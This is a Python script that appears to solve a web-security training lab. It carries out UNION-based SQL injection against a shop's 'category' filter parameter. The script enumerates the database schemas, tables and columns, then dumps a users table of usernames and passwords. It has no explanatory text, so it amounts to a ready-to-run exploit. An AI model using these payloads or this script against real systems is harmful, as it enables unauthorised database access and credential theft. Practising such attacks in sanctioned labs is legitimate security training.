
# SQL injection attack, listing the database contents on non-Oracle databases

# Assumptions:
    # We know number of returned columns
    # We know data type returned columns

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "https://0ac80074030a14e3c07e3ef000330021.web-security-academy.net/filter"

# Listing Databases

payload = "' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
dbs = bs.find_all('td')
print("[+] Available Databases")
for d in dbs:
    print(f'-> {d.text}')

# Listing tables from public database

payload = "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public'--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
tbs = bs.find_all('td')
print("\n[+] Available tables in public database")
for t in tbs:
    print(f'-> {t.text}')

# Listing columns in user table

payload = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_vmwxcn'--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
cols = bs.find_all('td')
print("\n[+] Available columns in users table")
for c in cols:
    print(f'-> {c.text}')


# Dumping Users table

payload = "' UNION SELECT username_qgsgju,password_tdngfk FROM users_vmwxcn--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False, proxies=proxy)
bs = BeautifulSoup(r.text, 'html.parser')
creds = bs.find_all('tr')
print("\n[+] Users table dump")
print("Username \tPassword")
for c in creds:
    print(f'{c.th.text} \t{c.td.text}')